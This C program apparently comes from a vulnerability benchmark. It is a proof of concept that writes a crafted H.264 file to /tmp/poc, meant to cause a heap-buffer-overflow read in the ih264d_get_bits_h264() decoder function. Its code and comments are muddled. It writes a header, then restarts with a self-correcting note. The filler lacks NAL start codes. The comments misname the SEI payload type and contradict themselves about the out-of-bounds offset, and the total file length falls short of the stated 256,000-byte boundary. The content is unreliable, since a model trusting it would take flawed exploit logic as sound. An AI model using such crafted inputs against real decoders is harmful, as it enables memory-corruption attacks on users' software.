#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* PoC for arvo:58190 */
/* Triggers: Heap-buffer-overflow READ of size 4 in ih264d_get_bits_h264() */
/* Vuln class: heap_buffer_overflow */
/* The decoder allocates a fixed 256000-byte bitstream buffer, but the */
/* multi-view stream requires a larger allocation. By crafting an SEI NAL */
/* unit with a Film Grain Characteristics payload, the parser reads 4 bytes */
/* past the end of the buffer. */

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* Write a minimal H.264/MVC bitstream that triggers the overflow.
       The exact byte layout is based on the vulnerable code path:
       - A NAL unit header indicating an SEI message (nal_unit_type=6)
       - An SEI payload type for Film Grain Characteristics (payloadType=1)
       - A payload size that causes the parser to read beyond the buffer
       - The parser reads 4 bytes at a time via ih264d_get_bits_h264(),
         so we need to position the read exactly at the buffer boundary.
    */

    /* NAL unit header: forbidden_zero_bit=0, nal_ref_idc=0, nal_unit_type=6 (SEI) */
    fputc(0x06, f);

    /* SEI payload type = 1 (Film Grain Characteristics) */
    fputc(0x01, f);

    /* SEI payload size: we want the parser to read 4 bytes past the end.
       The buffer is 256000 bytes. We'll fill the buffer with a valid
       bitstream up to the last few bytes, then place the SEI payload
       so that the 4-byte read crosses the boundary.
    */

    /* Fill the buffer with a valid H.264 bitstream (e.g., SPS/PPS and
       slice data) up to near the end. For simplicity, we fill with
       zeros and set the appropriate header bytes. The key is that the
       SEI NAL unit is placed so that the Film Grain payload extends
       past the end of the 256000-byte allocation.
    */

    /* We'll write a large file. The decoder allocates exactly
       MIN_BITSTREAMS_BUF_SIZE (256000) bytes. We need the SEI NAL unit
       to start at offset 256000 - 8, so that the 4-byte read at
       offset 256000 - 4 reads 4 bytes starting at offset 256000 - 4,
       which is 4 bytes into the out-of-bounds region (the read is
       exactly 0 bytes past the end, as described).
    */

    /* Write 256000 - 8 bytes of filler (zeros) before the SEI NAL unit.
       This ensures the SEI NAL unit starts at offset 256000 - 8.
    */
    size_t filler_len = 256000 - 8;
    for (size_t i = 0; i < filler_len; i++) {
        fputc(0x00, f);
    }

    /* Now write the SEI NAL unit. The NAL header is already written above,
       but we need to write it at the correct offset. Since we already wrote
       the header, we should write the rest of the SEI NAL unit here.
    */

    /* Actually, we need to restructure: write filler, then the NAL header,
       then the SEI payload type and size, then the payload.
    */

    /* Let's rewrite the file from scratch with the correct layout. */
    fclose(f);

    f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* Fill 256000 - 8 bytes with zeros (valid bitstream data) */
    filler_len = 256000 - 8;
    for (size_t i = 0; i < filler_len; i++) {
        fputc(0x00, f);
    }

    /* NAL unit header: SEI */
    fputc(0x06, f);

    /* SEI payload type = 1 (Film Grain Characteristics) */
    fputc(0x01, f);

    /* SEI payload size: we want the payload to extend past the buffer.
       The payload size is 4 bytes (since the parser reads 4 bytes at a
       time). We'll set payload size = 4, but the actual payload bytes
       will be missing, causing the read to go past the end.
    */
    fputc(0x04, f);

    /* The payload itself: 4 bytes that would be read. But since the buffer
       ends here, the 4-byte read will go out of bounds. We write these
       bytes anyway to complete the file, but the decoder's buffer is only
       256000 bytes, so the read at offset 256000 - 4 will be out of bounds.
    */
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f);

    fclose(f);
    return 0;
}